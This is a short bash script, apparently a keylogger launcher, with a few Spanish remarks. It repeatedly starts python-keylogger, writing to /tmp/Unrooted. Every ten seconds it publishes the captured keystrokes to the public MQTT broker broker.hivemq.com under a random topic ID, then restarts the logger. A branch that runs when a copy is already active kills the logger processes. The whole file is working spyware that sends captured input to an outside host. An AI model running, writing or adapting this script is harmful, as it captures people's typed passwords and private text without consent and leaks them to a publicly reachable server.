#!/bin/bash


var=$(ps -aux | grep autologger | wc -l)
echo $var

log="/tmp/Unrooted"
rand=$(cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 10; echo;)

if [ $var -eq 3 ]; then



	touch $log
	notify-send -t 1000 $rand

	echo $rand | xclip


	while [ 0 ];

	do
		python-keylogger --log-file=$log --clean-file &>/dev/null &

		pid="$(pidof /usr/bin/python /usr/bin/python-keylogger | awk '{ print $1 }')"

		sleep 10
		
		mosquitto_pub -h broker.hivemq.com -p 1883 -t $rand -m "$(printf "_%s_" $(cat $log))"
		
		kill $pid
	done
else

	notify-send -t 1000 -u critical "Kill"
	mosquitto_pub -h broker.hivemq.com -p 1883 -t $rand -m "muerto"

	kill $(printf "%s " $(ps -aux | grep logger | awk '{ print $2 }'))
	
	echo "más grande ctm"
fi
